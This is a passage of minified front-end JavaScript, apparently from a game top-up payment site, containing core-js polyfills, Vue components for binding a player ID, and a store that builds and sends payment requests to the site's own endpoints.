n=String(this);if(void 0===t&&0===e)return[];if(!l(t))return m.call(n,t,e);for(var r,i,o,s=[],a=(t.ignoreCase?'i':'')+(t.multiline?'m':'')+(t.unicode?'u':'')+(t.sticky?'y':''),c=0,u=void 0===e?O:e>>>0,f=new RegExp(t.source,a+'g');(r=d.call(f,n))&&!(c<(i=f[v])&&(s.push(n.slice(c,r.index)),1<r[h]&&r.index<n[h]&&p.apply(s,r.slice(1)),o=r[0][h],c=i,s[h]>=u));)f[v]===r.index&&f[v]++;return c===n[h]?!o&&f.test('')||s.push(''):s.push(n.slice(c)),s[h]>u?s.slice(0,u):s}:'0'[s](void 0,0)[h]?function(t,e){return void 0===t&&0===e?[]:m.call(this,t,e)}:m,[function(t,e){var n=i(this),r=null==t?void 0:t[o];return void 0!==r?r.call(t,n,e):y.call(String(n),t,e)},function(t,e){var n=g(y,t,this,e,y!==m);if(n.done)return n.value;var r=_(t),i=String(this),o=b(r,RegExp),s=r.unicode,a=(r.ignoreCase?'i':'')+(r.multiline?'m':'')+(r.unicode?'u':'')+(S?'y':'g'),c=new o(S?r:'^(?:'+r.source+')',a),u=void 0===e?O:e>>>0;if(0==u)return[];if(0===i.length)return null===C(c,i)?[i]:[];for(var f=0,l=0,d=[];l<i.length;){c.lastIndex=S?l:0;var p,h=C(c,S?i:i.slice(l));if(null===h||(p=I(x(c.lastIndex+(S?0:l)),i.length))===f)l=w(i,l,s);else{if(d.push(i.slice(f,l)),d.length===u)return d;for(var v=1;v<=h.length-1;v++)if(d.push(h[v]),d.length===u)return d;l=f=p}}return d.push(i.slice(f)),d}]})},asvx:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var r=n("HkTM");e.default=function(t,e){return void 0===e&&(e=location.href),t instanceof Array||(t=[t]),e=e.replace(/[\r\n]/g,''),r.default(t,function(t){e=(e=e.replace(new RegExp('(?:&'+t+'=[^&]*)','g'),'')).replace(new RegExp('(?:\\?'+t+'=[^&]*&?)','g'),'?')}),e}},at5L:function(t,e,n){var s=n("ezc+"),a=n("ml72"),c=n("sdkr")(!1),u=n("8kJd")('IE_PROTO');t.exports=function(t,e){var n,r=a(t),i=0,o=[];for(n in r)n!=u&&s(r,n)&&o.push(n);for(;e.length>i;)s(r,n=e[i++])&&(~c(o,n)||o.push(n));return o}},b8Rm:function(t,e){t.exports=function(t){if('function'!=typeof t)throw TypeError(t+' is not a function!');return t}},c852:function(t,e,n){"use strict";var r=n("+cRh"),i=n.n(r);e.default=i.a},"d3/y":function(t,e,n){var r=n("X6VK");r(r.S+r.F*!n("GGqZ"),'Object',{defineProperty:n("U1KF").f})},dVhv:function(t,e,n){"use strict";var r=n("uRBY")(!0);t.exports=function(t,e,n){return e+(n?r(t,e).length:1)}},doIl:function(t,e,n){"use strict";var r=n("63Ad");n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0,n("9p7t"),n("W1QL"),n("K/PF"),n("t91x"),n("75LO"),n("+3V6");var i=r(n("HcM6")),o={name:"bindinput",props:{store:Object,user:{validator:function(t){return null===t||t.charac_name&&t.userid}},dlist:{validator:function(t){return null===t||Array.isArray(t)}},platforms:Object,btntxt:String,gameid:String,charac_name:String,placeholder:String,modify_txt:String,enableAutoSetScrollTop:Boolean},data:function(){return{shortId:'',errorTxt:'',showDropDown:!1,dropDownLists:this.dlist?this.dlist:[],needselectpf:!!this.platforms,plats:Object.keys(this.platforms||{}),userInfo:this.user?this.user:null}},computed:{modify:function(){return!!this.userInfo&&!1!==this.userInfo.modify}},mounted:function(){this.$emit('edit',!this.userInfo),this.user&&this.$emit('login',{openid:this.user.openid,userid:this.user.shortId||this.user.userid,charac_name:decodeURIComponent(this.user.charac_name)})},watch:{userInfo:function(t){this.$emit('edit',!t)},shortId:function(t,e){t!==e&&this.errorTxt.length&&this.resetErrorStatus()}},components:{platselect:i.default},methods:{resetErrorStatus:function(){this.errorTxt=''},setErrorStatus:function(t){'string'==typeof t&&(this.errorTxt=t)},untypeItem:function(e){var t=this;this.dropDownLists=this.dropDownLists.filter(function(t){return t.userid!==e.userid}),this.store.unbindUser(e),this.shortId===e.userid&&this.$nextTick(function(){t.shortId=''})},slectPF:function(){this.resetErrorStatus()},clearInput:function(){this.shortId='',this.resetErrorStatus(),this.$refs.inputbox.focus()},getElementOffsetTop:function(t){return 0===t.offsetTop&&t.offsetParent?this.getElementOffsetTop(t.offsetParent):0<t.offsetTop?t.offsetTop:0},clickInput:function(){this.enableAutoSetScrollTop&&/android/.test(navigator.userAgent.toLowerCase())&&$(document).scrollTop(this.getElementOffsetTop(this.$refs.inputbox)/(window.devicePixelRatio||2))},focusInput:function(){this.showDropDown=!0,this.resetErrorStatus()},keydown:function(){this.getGameInfo()},blurInput:function(){this.showDropDown=!1},onInput:function(t){this.shortId!==t.target.value&&this.store.cancelCharacReq()},selectItem:function(t){this.shortId=t.userid,this.showDropDown=!1;var e=this;this.$nextTick(function(){e.shortId=t.userid,e.getGameInfo()})},changeOpenid:function(){report.click('playerid_change'),this.userInfo=null,this.resetErrorStatus(),this.store.setOpenid({openid:null})},getGameInfo:function(){report.click('playerid_confirm',{playerid:this.shortId});var e=this;this.shortId?(this.showDropDown=!1,this.store.getCharac(this.shortId).then(function(t){e.userInfo={openid:t.openid,userid:e.shortId,charac_name:decodeURIComponent(t.charac_name)},e.dropDownLists.filter(function(t){return t.userid===e.shortId}).length||e.dropDownLists.unshift({openid:t.openid,userid:e.shortId,charac_name:decodeURIComponent(t.charac_name)}),e.$emit('login',{openid:t.openid,userid:e.shortId,charac_name:decodeURIComponent(t.charac_name)})}).catch(function(t){e.errorTxt=(window.langResource.idInvalid||'invalid player id')+("("+(t.err_code||t.ret||''))+")"})):this.errorTxt=window.langResource.idRequired||'Player ID is required'}}};e.default=o},e2Kn:function(t,e,n){"use strict";function r(t){var e=f(t,!1);if('string'==typeof e&&2<e.length){var n,r,i,o=(e=_?e.trim():p(e,3)).charCodeAt(0);if(43===o||45===o){if(88===(n=e.charCodeAt(2))||120===n)return NaN}else if(48===o){switch(e.charCodeAt(1)){case 66:case 98:r=2,i=49;break;case 79:case 111:r=8,i=55;break;default:return+e}for(var s,a=e.slice(2),c=0,u=a.length;c<u;c++)if((s=a.charCodeAt(c))<48||i<s)return NaN;return parseInt(a,r)}}return+e}var i=n("P56o"),o=n("ezc+"),s=n("n+VH"),a=n("jEou"),f=n("5MU4"),c=n("E7Vc"),u=n("zIds").f,l=n("1Tj+").f,d=n("U1KF").f,p=n("hGr/").trim,h='Number',v=i[h],m=v,g=v.prototype,y=s(n("Vx+c")(g))==h,_='trim'in String.prototype;if(!v(' 0o1')||!v('0b1')||v('+0x1')){v=function(t){var e=arguments.length<1?0:t,n=this;return n instanceof v&&(y?c(function(){g.valueOf.call(n)}):s(n)!=h)?a(new m(r(e)),n,v):r(e)};for(var b,w=n("GGqZ")?u(m):"MAX_VALUE,MIN_VALUE,NaN,NEGATIVE_INFINITY,POSITIVE_INFINITY,EPSILON,isFinite,isInteger,isNaN,isSafeInteger,MAX_SAFE_INTEGER,MIN_SAFE_INTEGER,parseFloat,parseInt,isInteger".split(','),x=0;w.length>x;x++)o(m,b=w[x])&&!o(v,b)&&d(v,b,l(m,b));(v.prototype=g).constructor=v,n("sU/p")(i,h,v)}},"ezc+":function(t,e){var n={}.hasOwnProperty;t.exports=function(t,e){return n.call(t,e)}},fQty:function(t,e){t.exports='constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf'.split(',')},fnX1:function(t,e,n){"use strict";var r=n("u3tx"),i=n.n(r);e.default=i.a},gRlk:function(t,e,n){var i=n("X6VK"),o=n("R5TD"),s=n("E7Vc");t.exports=function(t,e){var n=(o.Object||{})[t]||Object[t],r={};r[t]=e(n),i(i.S+i.F*s(function(){n(1)}),'Object',r)}},"gtO+":function(t,e,n){"use strict";var i=n("b8Rm");function r(t){var n,r;this.promise=new t(function(t,e){if(void 0!==n||void 0!==r)throw TypeError('Bad Promise constructor');n=t,r=e}),this.resolve=i(n),this.reject=i(r)}t.exports.f=function(t){return new r(t)}},"hGr/":function(t,e,n){function r(t,e,n){var r={},i=a(function(){return!!c[t]()||"​"!="​"[t]()}),o=r[t]=i?e(l):c[t];n&&(r[n]=o),s(s.P+s.F*i,'String',r)}var s=n("X6VK"),i=n("GCOZ"),a=n("E7Vc"),c=n("SvMv"),o='['+c+']',u=RegExp('^'+o+o+'*'),f=RegExp(o+o+'*$'),l=r.trim=function(t,e){return t=String(i(t)),1&e&&(t=t.replace(u,'')),2&e&&(t=t.replace(f,'')),t};t.exports=r},hhdQ:function(t,e,n){"use strict";function r(){var t=this,e=t.$createElement,n=t._self._c||e;return t.showBox?n('div',{staticClass:"pop-mode-box",attrs:{id:"pop-box"}},[n('div',{staticClass:"pop-mode notification-message-pop show"},[n('div',{staticClass:"mess have-desc"},[n('p',[t._v(t._s(t.title||'Notification'))])]),t._v(" "),n('div',{staticClass:"desc max-desc"},[n('p',[t._v(t._s(t.desc))])]),t._v(" "),n('div',{staticClass:"btn-wrap"},[n('div',{staticClass:"btn",on:{click:t.closeMore}},[t._v(t._s(t.btn))])])])]):t._e()}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},iJnn:function(t,e,n){var o=n("PAFS");t.exports=function(e,t,n,r){try{return r?t(o(n)[0],n[1]):t(n)}catch(t){var i=e.return;throw void 0!==i&&o(i.call(e)),t}}},ifxA:function(t,e,n){"use strict";var r=n("9f4c"),i=n.n(r),o=n("wvFD"),s=n.n(o),a='1'===i()().midas_sdk;e.a=function(t){if(a){(t=t||{}).action='response';var e=s()(t,!0);e='oversea://jsbridge?'+e,alert(e)}}},it7j:function(t,e,n){"use strict";var r=n("X6VK"),i=n("1wfo")(5),o='find',s=!0;o in[]&&Array(1)[o](function(){s=!1}),r(r.P+r.F*s,'Array',{find:function(t,e){return i(this,t,1<arguments.length?e:void 0)}}),n("OfmW")(o)},iur1:function(t,e,n){n("GGqZ")&&'g'!=/./g.flags&&n("U1KF").f(RegExp.prototype,'flags',{configurable:!0,get:n("MBcE")})},j0fK:function(t,e,n){"use strict";function r(){var t=this,e=t.$createElement,n=t._self._c||e;return t.datas.tips||t.datas.imgs&&t.datas.imgs.length?n('div',{staticClass:"tips-box"},[t.datas.tips?n('p',[t._v(t._s(t.datas.tips))]):t._e(),t._v(" "),t._l(t.datas.imgs,function(t){return n('img',{attrs:{src:t,alt:"img"}})})],2):t._e()}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},jEou:function(t,e,n){var o=n("Bsg+"),s=n("3ydu").set;t.exports=function(t,e,n){var r,i=e.constructor;return i!==n&&'function'==typeof i&&(r=i.prototype)!==n.prototype&&o(r)&&s&&s(t,r),t}},jPEw:function(t,e,n){var r=n("U1KF").f,i=n("ezc+"),o=n("9dxi")('toStringTag');t.exports=function(t,e,n){t&&!i(t=n?t:t.prototype,o)&&r(t,o,{configurable:!0,value:e})}},jPba:function(t,e,n){"use strict";var r=n("X6VK"),i=n("R5TD"),o=n("P56o"),s=n("5Fu2"),a=n("khIB");r(r.P+r.R,'Promise',{finally:function(e){var n=s(this,i.Promise||o.Promise),t='function'==typeof e;return this.then(t?function(t){return a(n,e()).then(function(){return t})}:e,t?function(t){return a(n,e()).then(function(){throw t})}:e)}})},kUmS:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var r=n("HkTM"),i=n("E2HC");e.default=function(t){if(!i.default(t))return[];var n=[];return r.default(t,function(t,e){n.push(e)}),n}},kaBe:function(t,e,n){"use strict";n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var r={name:'MessageBox',props:{title:{type:String,default:'Notification'},desc:{type:String,default:''},btn:{type:String,default:'Understand'}},data:function(){return{showBox:0}},methods:{closeMore:function(){this.$emit('ok')},show:function(){this.showBox=1},hide:function(){this.showBox=0}}};e.default=r},khIB:function(t,e,n){var r=n("PAFS"),i=n("Bsg+"),o=n("gtO+");t.exports=function(t,e){if(r(t),i(e)&&e.constructor===t)return e;var n=o.f(t);return(0,n.resolve)(e),n.promise}},kqRc:function(t,e,n){"use strict";var r=n("0LVR"),i=n.n(r);e.default=i.a},lAKj:function(t,e,n){"use strict";var r,i,s=n("MBcE"),a=RegExp.prototype.exec,c=String.prototype.replace,o=a,u='lastIndex',f=(r=/a/,i=/b*/g,a.call(r,'a'),a.call(i,'a'),0!==r[u]||0!==i[u]),l=void 0!==/()??/.exec('')[1];(f||l)&&(o=function(t){var e,n,r,i,o=this;return l&&(n=new RegExp('^'+o.source+'$(?!\\s)',s.call(o))),f&&(e=o[u]),r=a.call(o,t),f&&r&&(o[u]=o.global?r.index+r[0].length:e),l&&r&&1<r.length&&c.call(r[0],n,function(){for(i=1;i<arguments.length-2;i++)void 0===arguments[i]&&(r[i]=void 0)}),r}),t.exports=o},lQyR:function(t,e,n){"use strict";var r=n("uRBY")(!0);n("Jww/")(String,'String',function(t){this._t=String(t),this._i=0},function(){var t,e=this._t,n=this._i;return n>=e.length?{value:void 0,done:!0}:(t=r(e,n),this._i+=t.length,{value:t,done:!1})})},lusK:function(t,e,n){"use strict";var r=n("j0fK"),i=n("RKkF"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},lxD7:function(t,e,n){"use strict";n.r(e),n.d(e,"xMidasInit",function(){return i}),n.d(e,"xMidasEncrypt",function(){return o});var r=n("wvFD"),s=n.n(r);function a(t){var e=Date.now(),n=t();return{times:Date.now()-e,result:n}}var c=function(t,e){var n=window.report;return'function'==typeof n?n('midasbuy.custom.'+t,e):'object'==typeof n&&'function'==typeof n.custom?n.custom(t,e):void 0};function i(){if(!document.getElementById('xMidasToken').value)return c('xmidas.no.token');try{var t=a(function(){return window.xMidas()}),e=t.result||[];c('xmidas.init',{times:t.times}),0<e.length&&c('xmidas.init.result',{result:e.join(',')})}catch(t){}}function o(e){var t=s()(e,!0),n=document.getElementById('xMidasToken').value;if(!n)return e;var r,i=document.getElementById('xMidasVersion').value,o=a(function(){try{return window.xMidas({d:t})}catch(t){return e}});return o.result?(c('xmidas.encrypt',{times:o.times}),{encrypt_msg:(r=o.result,btoa(String.fromCharCode.apply(String,r.match(/../g).map(function(t){return parseInt(t,16)})))),ctoken_ver:i,ctoken:n}):(c('xmidas.error',{times:o.times}),e)}},mggL:function(t,e,n){var r=n("Bsg+"),i=n("P56o").document,o=r(i)&&r(i.createElement);t.exports=function(t){return o?i.createElement(t):{}}},ml72:function(t,e,n){var r=n("Cmsx"),i=n("GCOZ");t.exports=function(t){return r(i(t))}},mvii:function(t,e){var n=Math.ceil,r=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(0<t?r:n)(t)}},"n+VH":function(t,e){var n={}.toString;t.exports=function(t){return n.call(t).slice(8,-1)}},nDPO:function(t,e,n){"use strict";var l=n("05cK"),d=function(){var t=document.cookie.match(/UUID=([^;]*);?/);return t?t[1]:null},r=n("BUht"),c=n.n(r),i=n("9f4c"),o=n.n(i),s=n("wvFD"),p=n.n(s),h=n("QMnT"),a=n("I2RX"),u=n("SRKO"),v=n("MCcP"),f=function(t){var e=t;try{e=decodeURIComponent(t)}catch(t){}return e.replace(/>/g,'&gt;')},m=n("lxD7");n("Jeu6");function g(t){var e=t?1e3*parseInt(t):null,n=new Date;function r(t){return t.length<2?'0'+t:t}e&&n.setTime(e);var i=(n.getUTCMonth()+1).toString(),o=n.getUTCDate().toString(),s=n.getUTCHours().toString(),a=n.getUTCMinutes().toString(),c=n.getUTCSeconds().toString(),u=n.getUTCFullYear()+'-';return u+=(i=r(i))+'-'+(o=r(o))+'T'+(s=r(s))+':'+(a=r(a))+':'+(c=r(c))+'Z'}function y(){return(new Date).getTime()}var _=window.CHANNEL_INFO,b=window.__PAY_INFO,w=window.__Report_INFO||{},x=n("BrhN"),C=/MicroMessenger/i.test(navigator.userAgent.toLowerCase()),I='/interface/getCharac',O='/interface/getTrans',S='/interface/getDrmInfo',P='/interface/unbindUser',D='/interface/getPayRes',E='/interface/getBuyStatus',T='/interface/queryDrmLimitNoLogin',k=(M.prototype.__init=function(){var t=this.getBindUser();if(t&&t.pf){var e=b.pf.split('midasweb'),n=t.pf;1<e.length&&(n+=e[1]),this.pfinfo.pf=n}else this.pfinfo.pf=b.pf;t&&t.zoneid?this.pfinfo.zoneid=t.zoneid:this.pfinfo.zoneid=b.zoneid;var r=window.tfp,i=this;r&&r('getToken',function(t){r.app.getFingerPrint(t,function(t){i.fingerprint=t.fp})}),Object(m.xMidasInit)()},M.prototype.getMsgUrl=function(){return location.protocol+'//'+location.hostname+':'+location.port+'/oversea_web/static/receiveMsg.html?buy_type_key='+this.getStorageKey()},M.prototype.getCountry=function(){return this.payInfo.country},M.prototype.getNeedSelectPF=function(){return this.payInfo.needSelectPF},M.prototype.getActiveData=function(){return this.activeData||this.getLocalActiveData()},M.prototype.getLocalActiveData=function(){var t=Object(a.a)("ACTIVEDATA_"+b.openid);return t?t.data:''},M.prototype.saveLocalActiveData=function(t,e){return Object(h.a)("ACTIVEDATA_"+t,{data:e})},M.prototype.fetchActiveData=function(){var e=this;if(window.needActiveData){this.activeData='';var n=b.openid,t=b.appid,r=c.a.extend(this._getInterfaceParams(),{openid:n,offerid:t});this._sendReq('/interface/getUserActive',r,'get').then(function(t){t&&0===t.ret&&(e.activeData=t.data||'',e.saveLocalActiveData(n,t.data))}).catch(function(t){})}},M.prototype.setPF=function(t,e){var n=b.pf.split('-');n[2]&&(n[2]=t),this.pfinfo.pf=n.join('-'),this.pfinfo.zoneid=e},M.prototype.getCurrentChannel=function(){return this.channelInfo.currentChannel},M.prototype.setCurrentChannel=function(t){this.channelInfo.currentChannel=t},M.prototype.getPayInfo=function(){return this.payInfo},M.prototype.getChannelInfo=function(){var t=this.channelInfo;return C?t.wechat&&(t.wechat.supportJsApi?t.adyen_wechat&&delete t.adyen_wechat:delete t.wechat):t.adyen_wechat&&delete t.adyen_wechat,t},M.prototype.getBrowserParams=function(){return this.browserParams},M.prototype.onDataChange=function(t){this._dataChangeCallback=t},M.prototype.onTokenExpire=function(t){this._tokenExpireCallback=t},M.prototype.getChannelData=function(){var t=window.GAME_INFO,e=t.productid_list,r=[],i=t.channel.map(function(t){return t.id}),o=this,s=this.getChannelInfo(),a=this.getCountry();return e.forEach(function(t){if(s[t.id]&&-1!==i.indexOf(t.id)){var e=s[t.id];if(e.id=t.id,e.src=e.icon?e.icon:e.icon_pc?e.icon_pc:e.icon_h5?e.icon_h5:'',Array.isArray(e.imgs)){var n=e.imgs.filter(function(t){return'object'==typeof t&&Array.isArray(t[a.toLocaleLowerCase()])});n.length?e.imgs=n[0][a.toLocaleLowerCase()]:e.imgs=e.imgs.filter(function(t){return'string'==typeof t})}e.productDatas=o._processDrm(t.productid_info,t.id),r.push(e)}else console}),r},M.prototype._processDrm=function(t,c){var e=window.MP_INFO,u=[],f=0,n=this.getCountry().toLowerCase();return e&&e.buycurrency&&(x.setInfo(e),f=1),(t=t.filter(function(t){return(t.country||'').toLowerCase()===n})).forEach(function(t){var e=JSON.parse(JSON.stringify(t));e.fprice=Object(l.a)(e.price,e.currency_type),e.gift=[],e.id=e.productid;var n=b.currencyIcon;if(Array.isArray(b.currencyIconMap)){var r=e.num,i=b.currencyIconMap.find(function(t){return t.min&&t.max?+r>=+t.min&&+r<=+t.max:t.min&&!t.max?+r>=+t.min:t.max&&!t.min?+r<=+t.max:void 0});n=(i=i&&i.icon)||n}if(e.icon=n,e.smallicon=b.currencySmallIcon,1===f){var o=x.getSendCount(parseInt(e.num),c);if(o){e.send=o.__sendNum;var s=[],a=[];o.product_item.forEach(function(t){s.push(t.name+' x '+t.num),t.url&&a.push(t.url)}),e.gift_icon=a,e.gift=s,e.mktips=window.langResource[o.send_ext]||o.send_ext}}u.push(e)}),u.sort(function(t,e){return t.price-e.price})},M.prototype.getOpenId=function(){return b.openid},M.prototype.setOpenid=function(t){b.openid=t.openid},M.prototype.getCharacName=function(){var t='';if(b.charac_name)t=f(b.charac_name);else{var e=this.getBindUser();t=e&&e.charac_name?e.charac_name:''}return t.replace(/>/g,'&gt;')},M.prototype.setCharacName=function(t){b.charac_name=t.charac_name},M.prototype.getProductItem=function(){return this.product_item},M.prototype.setProductItem=function(t){this.product_item=t;var e=this.browserParams,n=this._getInterfaceParams(),r=c.a.extend({appid:n.appid,country:n.country.toLowerCase(),name:t.name,num:t.num},e);this.browserParams.redirecturl&&(t.redirecturl=this.browserParams.redirecturl),Object(h.a)(this.getStorageKey(),c.a.extend({rediretParams:r,saveTime:(new Date).getTime()},t))},M.prototype.getStorageKey=function(){var t=this.getPayInfo().pageid;return v.a.CURRENT_BUY_ITEM+'_'+this.getBuyType()+'_'+t},M.prototype.getBuyType=function(){return''},M.prototype.getOrderProduct=function(){return''},M.prototype.getSessionId=function(){return'hy_gameid'},M.prototype.getFingerprint=function(){return this.fingerprint},M.prototype.getPublicParams=function(e){var t=b,n=this.getStorageKey(),r=d(),i=location.protocol+'//'+location.hostname+':'+location.port+'/callback/',o={};o.appid=t.appid,o.openid=this.getOpenId(),o.sandbox=t.sandbox,o.pf=this._getPf();var s=t.drm_info,a=this.getProductItem(),c=!1;a.channel&&'BG'===this.getBuyType()&&e&&a.channel.forEach(function(t){t.targetChannel===e.id&&(c=!t.matchedRule||t.used_quota>=t.uin_quota)}),c&&(s=Object.assign(s,{group_id:void 0})),o.drm_info=encodeURIComponent(p()(s,!0)),o.usePC=this.browserParams.usePC,o.pfkey=t.pfkey,o.currency_type=b.currency_type,o.country=b.country,o.session_id=this.getSessionId(),o.zoneid=this._getZoneid(),t.isv3&&(o.provide_type='uni_pdt',o.product_num='1',o.buytype='xx',o.___forcetype=1),o.productid=a.productid,o.ca=a.price,o.pendingUrl=i+'pending?buy_type_key='+n,o.successUrl=i+'success?buy_type_key='+n,o.failUrl=i+'fail?buy_type_key='+n,o.msgUrl=this.getMsgUrl(),o.version='midasbuy_v2',r&&(o.sessionToken=r),o.libtoken=t.adyen_url;var u=t.midasUser&&t.midasUser.avatarUrl?encodeURIComponent(t.midasUser.avatarUrl):'',f=this.getCharacName(),l={};return t.drm_info&&t.drm_info.task_token&&(l.NickImg=encodeURIComponent('name='+f+'&avater='+u)),l.muid=window.muid,this.getFingerprint()&&(l.risk_device_finger=this.getFingerprint()),o.cgi_extend=p()(l,!0),o.cgi_extend=o.cgi_extend.replace(/[!'()*]/g,''),300<o.cgi_extend.length&&(l.NickImg=encodeURIComponent('name='+f+'&avater='),o.cgi_extend=p()(l,!0),o.cgi_extend=o.cgi_extend.replace(/[!'()*]/g,'')),o.serverTime=g(t.adyen_svrtime),Object(h.a)(v.a.CURRENT_LOCATION,{url:location.href}),o},M.prototype.getBindUser=function(){var t=JSON.parse(JSON.stringify(b.currentBindUser||null));if(this.isMidasLogin()||t)return t&&t.charac_name&&(t.charac_name=f(t.charac_name)),t;if(!b.notStorageUserInfo){var e=this.getLoginRecord(b.appid);return e&&(b.openid=e.openid,b.userid=e.userid,b.charac_name=e.charac_name),e}},M.prototype.getGameUsers=function(){if(this.isMidasLogin()){var t=JSON.parse(JSON.stringify(b.gameUsers));return t&&t.length&&t.forEach(function(t){t.charac_name=f(t.charac_name)}),t}if(!b.notStorageUserInfo){var e=this.getLoginRecord(b.appid);return e?[e]:[]}},M.prototype._getShopCode=function(){return window._SHOPCODE},M.prototype._getInterfaceParams=function(){var t={};return t.muid=window.muid,this.getFingerprint()&&(t.risk_device_finger=this.getFingerprint()),t=p()(t,!0),{appid:b.appid,currency_type:b.currency_type,country:(b.country||'').toUpperCase(),midasbuyArea:b.midasbuyArea||'',sc:this.browserParams.sc||'',from:this.browserParams.from||'',task_token:this.browserParams.task_token||'',pf:this._getPf(),zoneid:this._getZoneid(),_id:Math.random(),drm_info:this._getDrmInfo(),shopcode:this._getShopCode(),cgi_extend:t,buyType:this.getBuyType().toLowerCase()}},M.prototype._getPf=function(){return this.pfinfo.pf},M.prototype._getDrmInfo=function(){return this.pfinfo.drm_info},M.prototype._getZoneid=function(){return this.pfinfo.zoneid},M.prototype.getCharac=function(r){if(b.short_openid_rule&&!new RegExp(b.short_openid_rule).test(r))return Promise.reject({ret:'wrong format'});var t=c.a.extend(this._getInterfaceParams(),{openid:r}),i=this;return new Promise(function(e,n){i._sendReq(I,t,'get').then(function(t){t&&0===t.ret?('normal'===b.short_openid_type&&(t.info.openid=r),i.saveLoginRecord(b.appid,{userid:r,openid:t.info.openid,charac_name:t.info.charac_name,pf:i._getPf().split('midasweb')[0]+'midasweb',zoneid:i._getZoneid()}),e(t.info)):n(t)}).catch(function(t){n(t)})})},M.prototype.cancelCharacReq=function(){this.characReq&&this.characReq.abort()},M.prototype.getTrans=function(){var t=this._getInterfaceParams(),r=this;return new Promise(function(e,n){r._sendReq(O,t,'get').then(function(t){0===t.ret?e(t.data):n(t)}).catch(function(t){n(t)})})},M.prototype._changeGameData=function(t){var e=c.a.extend(this._getInterfaceParams(),{openid:t.openid});this.setOpenid(t),this.setCharacName(t);var n=this;this._sendReq(S,e,'get').then(function(t){0===t.ret&&(window.GAME_INFO=t.info,window.MP_INFO=t.mp_info,n._dataChangeCallback())})},M.prototype.getDrmInfoByUserInfo=function(t){this._changeGameData(t)},M.prototype._reportNet=function(t,e){var n=window.report;n&&n.network&&n.network(t,e)},M.prototype._reportErr=function(t,e){var n=window.report;n&&n.error&&n.error(t,e)},M.prototype._sendReq=function(i,o,t){var s=this,a=i.replace('/interface/','');return w.devMode&&console.debug,new Promise(function(e,n){s._reportNet(a+'.start',{});var r=y();s.characReq=c.a.ajax({method:'post'===t?'POST':'GET',data:Object(m.xMidasEncrypt)(o),url:i}).done(function(t){if(s._reportNet(a+'.success',{times:y()-r,ret:t.ret}),-1!==[6,7,8].indexOf(t.ret))return s._reportErr('tokenerror',{interface:i,ret:t.ret,params:JSON.stringify(o)}),s._tokenExpireCallback();s.characReq=void 0,e(t)}).fail(function(t,e){s._reportNet(a+'.fail',{times:y()-r,ret:-9999}),s.characReq=void 0,n({ret:-9999,statusCode:e})})})},M.prototype.unbindUser=function(t){var e=this.getPublicParams(),n=this.getLoginRecord(e.appid);if(n&&n.userid===t.userid&&Object(h.a)(this.loginRecordKey(e.appid),null),this.isMidasLogin()){var r={appid:e.appid,userid:t.userid,openid:t.openid,r:Math.random()};this._sendReq(P,r,'GET').then(function(){})}},M.prototype.setBuyType=function(t){this.buytype=t},M.prototype.getPayRes=function(t){var e=this.getPublicParams(),n={appid:e.appid,pf:e.pf,openid:e.openid,r:Math.random(),portal_serial_no:t};return this._sendReq(D,n,'GET')},M.prototype.getBuyStatus=function(t){var e={openid:t,appid:b.appid};return this._sendReq(E,e,'GET')},M.prototype.queryDrmLimitNoLogin=function(t){return this._sendReq(T,t,'GET')},M.prototype.isMidasLogin=function(){return b&&null!==b.midasUser},M.prototype.getComplianceKey=function(){return"compliance_"+b.openid+"_"+b.country},M.prototype.getComplianceRecord=function(){return Object(a.a)(this.getComplianceKey())},M.prototype.saveComplianceRecord=function(){return Object(h.a)(this.getComplianceKey(),!0)},M.prototype.loginRecordKey=function(t){return(b.storageUserInfoKey||'')+"loginrecord_"+t},M.prototype.saveLoginRecord=function(t,e){return Object(h.a)(this.loginRecordKey(t),e)},M.prototype.getLoginRecord=function(t){var e=Object(a.a)(this.loginRecordKey(t));for(var n in e)e[n]=decodeURIComponent(e[n]);return e},M);function M(){this.browserParams={},this.channelInfo=_,this.pfinfo={pf:'',zoneid:''},this.payInfo=b,this.buytype='',this.fingerprint='',this.activeData='',this._dataChangeCallback=function(){},this._tokenExpireCallback=function(){},this.product_item=null,this.browserParams=o()(),Object(u.a)(v.a.CURRENT_BUY_ITEM,36e5),this.__init()}e.a=k},oGmy:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var r=n("6mBe");e.default=function(t){return r.default('Array',t)}},p6P0:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var i=n("wvFD"),o=n("asvx"),s=n("kUmS"),a=n("E2HC");e.default=function(t,e){if(!a.default(t))return e;var n=s.default(t);if(0===n.length)return e;e=o.default(n,e);var r=i.default(t);return e+=/(\?|&)$/.test(e)?''+r:/\?/.test(e)?'&'+r:'?'+r}},pB2m:function(t,e,n){var r=n("OFVL"),i=n("9dxi")('iterator'),o=n("Ibj2");t.exports=n("R5TD").getIteratorMethod=function(t){if(null!=t)return t[i]||t['@@iterator']||o[r(t)]}},"pU1/":function(t,e,n){var s=n("U1KF"),a=n("PAFS"),c=n("LuBU");t.exports=n("GGqZ")?Object.defineProperties:function(t,e){a(t);for(var n,r=c(e),i=r.length,o=0;o<i;)s.f(t,n=r[o++],e[n]);return t}},pime:function(t,e,n){"use strict";var r=n("vmRi"),i=n.n(r);e.default=i.a},psIG:function(t,e,n){"use strict";function r(t,e,n,r,i,o,s,a){var c,u='function'==typeof t?t.options:t;if(e&&(u.render=e,u.staticRenderFns=n,u._compiled=!0),r&&(u.functional=!0),o&&(u._scopeId='data-v-'+o),s?(c=function(t){(t=t||this.$vnode&&this.$vnode.ssrContext||this.parent&&this.parent.$vnode&&this.parent.$vnode.ssrContext)||'undefined'==typeof __VUE_SSR_CONTEXT__||(t=__VUE_SSR_CONTEXT__),i&&i.call(this,t),t&&t._registeredComponents&&t._registeredComponents.add(s)},u._ssrRegister=c):i&&(c=a?function(){i.call(this,this.$root.$options.shadowRoot)}:i),c)if(u.functional){u._injectStyles=c;var f=u.render;u.render=function(t,e){return c.call(e),f(t,e)}}else{var 